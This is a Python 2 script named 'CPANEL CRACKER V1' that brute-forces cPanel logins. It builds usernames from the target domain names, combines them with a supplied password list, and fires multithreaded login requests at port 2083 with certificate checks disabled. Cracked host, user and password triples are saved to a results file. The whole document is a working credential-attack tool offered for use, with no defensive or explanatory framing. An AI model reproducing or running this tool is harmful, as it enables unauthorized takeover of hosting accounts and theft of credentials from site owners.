#!/usr/bin/python
#./lol.py 100 list.txt passwords.txt
#Edited by MR008 TN
import sys
import Queue
import threading
import tldextract
from ftplib import FTP
import requests
import random
from random import choice
import re
import socket
from threading import Timer
from colorama import Fore, Style, Back, init
import operator
try:
	requests.packages.urllib3.disable_warnings()
except Exception, e:
	pass
init(autoreset=True)
ktnred = '\033[31m'
ktngreen = '\033[32m'
ktn3yell = '\033[32m'
ktn4blue = '\033[34m'
ktn5purp = '\033[35m'
ktn6blueblue = '\033[36m'
ktn7grey = '\033[37m'
CEND = '\033[0m'
print'''
  
                   \033[32m=-        ==                   
                 \033[32m-@@@=      @@@@-                 
                \033[32m=@@@@@@   -@@@@@@=                
              \033[32m-@@@@@@@@@- @@@@@@@@@               
             \033[32m=@@@@@@@@@@@= =@@@@@@@@-             
            \033[32m@@@@@@@=@@@@@@@--==@@@@@@=            
          \033[32m-@@@@@@=   =@@@@@@=  -@@@@@@@-          
         \033[32m=@@@@@@-  -@--@@@@@@@   =@@@@@@=         
       \033[32m-@@@@@@@   =@@@= =@@@@@@-  -@@@@@@@        
      \033[32m-@@@@@@=   @@@@@@= -======-   =@@@@@@-      
     \033[32m=@@@@@@@= -@@@@@@= =@@@@@@@@@@@@@@@@@@@=     
   \033[32m-@@@@@@@@= =@@@@@@--@@@@@@@@@@@@@@@@@@@@@@@-   
  \033[32m-========--@@@@@@= -=========================-  
           \033[32m=@@@@@@=------------=======-           
          \033[32m@@@@@@@@@@@@@@@@@@@@@@@@@@@@@=          
        \033[32m-@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@-        
        \033[32m------------------------==========        
               \033[31m Powered By MR008 TN \033[31m

          \033[31m### \033[32mWelcome to \033[32m Valknut \033[32mBOT  \033[31m###\033[0m

                \033[31m CPANEL CRACKER V1\033[31m

'''

def watchdog():
	return False

filename_cpanel = "Result/Cpanels.txt"
fisier_vuln_cpanel = open(filename_cpanel,'a')


class brute(threading.Thread):
	def __init__(self, queue):
		threading.Thread.__init__(self)
		self.queue = queue
	def run(self):
		while True:
			ip,user,passwd = self.queue.get()
			self.bruter(ip,user,passwd)
			self.queue.task_done()

	def bruter(self,ip,user,passwd):
		passwd=str(passwd)
		try:
			if ip in found: return False

			url = ip

			if '%null%' in passwd:
				return ""
			elif '%user%' in passwd:
				user=user.replace('-','').replace('.','').replace('_','')
				passwd=passwd.replace('%user%',user)
			elif '%User%' in passwd:
				user=user.replace('-','').replace('.','').replace('_','')
				passwd=passwd.replace('%User%',user)

			print '\033[31m+ \033[32m==> \033[32mTrying! \033[32m'+ip+':\033[0m'+user+':\033[36m'+passwd

			login_data = {'user' : user, 'pass' : passwd}
			s = requests.session()
			ttt = Timer(20, watchdog)
			ttt.start()
			r1 = s.post('https://'+url+':2083/login/?login_only=1', data=login_data, verify=False, timeout=18)
			ttt.cancel()
			json_login = r1.text

			sess_login = re.compile("security_token\":\"(.+)\"}")
			sess_login = sess_login.search(json_login)
			sess_login = sess_login.group(1)
			print "\n\033[32m[+++] \033[36mFound cPanel : \033[32m"+url+",\033[0m"+user+",\033[32m"+passwd

			found.append(url)

			fisier_vuln_cpanel.write("https://"+url+":2083,"+user+","+passwd+"\n")

			#clean
			fisier_vuln_cpanel.flush()
			login_data.flush()
			url.flush()
			sess_login.flush()
			r1.flush()
			json_login.flush()


			return True
		except Exception, e:
			return False

def generateusers(ip):
	ext = tldextract.extract("https://"+ip)

	subdomeniu = ext[0].replace(".","").replace("-","")
	domeniu = ext[1].replace("-","")
	sufix = ext[2].replace(".","")

	lungime_subdomeniu = int(len(subdomeniu))
	lungime_domeniu = int(len(domeniu))
	diferenta_subdomeniu = int(8 - lungime_subdomeniu)
	diferenta_domeniu = int(8 - lungime_domeniu)
	diferenta_subdomeniu = int(6 - lungime_subdomeniu)
	diferenta_domeniu = int(6 - lungime_domeniu)
	diferenta_subdomeniu = int(4 - lungime_subdomeniu)
	diferenta_domeniu = int(4 - lungime_domeniu)


	#print "lungime domeniu: "+str(lungime_domeniu)+", diferenta domeniu: "+str(diferenta_domeniu)+" lungime subdomeniu: "+str(lungime_subdomeniu)+" diferenta subdomeniu: "+str(diferenta_subdomeniu)
	users = []


	if(lungime_domeniu >= 8):
		users.append(domeniu[:8])
	elif(lungime_domeniu >= 6):
		users.append(domeniu[:6])
	elif(lungime_domeniu >= 4):
		users.append(domeniu[:4])

	else:
		users.append(domeniu)

	return users



def brutemain():
	if len(sys.argv) < 2:
		print "\033[36mUSAGE: \033[32mlol.py 100 list.txt pass.txt\033[0m"
		return False
	ThreadNR = int(sys.argv[1])
	queue = Queue.Queue()
	try:
		i = 0
		for i in range(ThreadNR):
			t = brute(queue)
			t.daemon = True
			t.start()
			i += 1
	except Exception, e:
		print '[!] Cant start more than ',i,' threads!\n'

	global found
	found = []


	with open(str(sys.argv[2]),'rU') as ipf: ips = ipf.read().splitlines()
	with open(str(sys.argv[3]),'rU') as pf: passwords = pf.read().splitlines()


	stiva = {}

	try:
		print "\n\033[31m[!] \033[32mCreating \033[0murl:user:pass combinations, patience please.\n"
		counter = 1
		ips_lungime = len(ips)
		combinatie = dict()
		countery = 0
		for ip in ips:
			ip = ip.lower()
			ip.replace('www.','')
			stiva[ip] = dict()
			counterz = 0
			for user in generateusers(ip):
				for password in passwords:
					stiva[ip][counterz] = dict()
					stiva[ip][counterz] = str(user+","+password)
					counterz = counterz + 1
					countery = countery + 1



			print "\033[32m\n Generating combinations for domain: \033[36m"+str(counter)+" / \033[32m"+str(ips_lungime)
			counter = counter+1


		print "\n\033[31m[!] \033[32mRearranging combinations for better use, patience please.\033[0m\n"
		for k in range(0,countery):
			for ip in ips:
				try:
					#print ip+","+stiva[ip][k]
					split_string = stiva[ip][k].split(',',2)
					queue.put((ip,split_string[0],split_string[1]))
					del stiva[ip][k]
				except Exception, e:
					pass

		del stiva
		del k
		del ip
		#print "\n[!] Done creating url:user:pass combinations.\n"
	except Exception, e:
		print "\n[!] Error creating url:user:pass combinations!\n"


	queue.join()

if __name__ == "__main__":
	brutemain()
